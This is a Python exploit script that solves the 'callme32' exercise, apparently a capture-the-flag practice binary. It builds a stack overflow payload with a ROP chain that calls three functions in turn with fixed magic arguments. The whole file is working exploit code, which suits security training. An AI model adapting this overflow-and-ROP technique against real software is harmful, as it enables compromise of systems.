#!/usr/bin/python
import sys
import struct

# gdb ./callme32 -x gdb_script.gdb
# run < <(python challenge.py)

# 0x080484f0  callme_one@plt
# 0x08048550  callme_two@plt
# 0x080484e0  callme_three@plt

# 0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
pop_pop_pop_ret = b'\xf9\x87\x04\x08'

callme_one   = b'\xf0\x84\x04\x08'
callme_two   = b'\x50\x85\x04\x08'
callme_three = b'\xe0\x84\x04\x08'

deadbeef   = b'\xef\xbe\xad\xde' # 0xdeadbeef
cafebabe   = b'\xbe\xba\xfe\xca' # 0xcafebabe
doodfood   = b'\x0d\xf0\x0d\xd0' # 0xd00df00d

deadcode   = b'\xde\xc0\xad\xde' # 0xdeadc0de

payload = b'A'*40
payload += b'B'*4       # ebp

payload += callme_one
payload += pop_pop_pop_ret # pop three args for callme_one and go to callme_two

# arguments for callme_one
payload += deadbeef
payload += cafebabe
payload += doodfood

payload += callme_two      # Return address for callme_one
payload += pop_pop_pop_ret # pop three args for callme_two and go to callme_three

# arguments for callme_two
payload += deadbeef
payload += cafebabe
payload += doodfood

payload += callme_three    # Return address for callme_two
payload += deadcode        # Return address for callme_three

# arguments for callme_three
payload += deadbeef
payload += cafebabe
payload += doodfood

sys.stdout.buffer.write(payload)
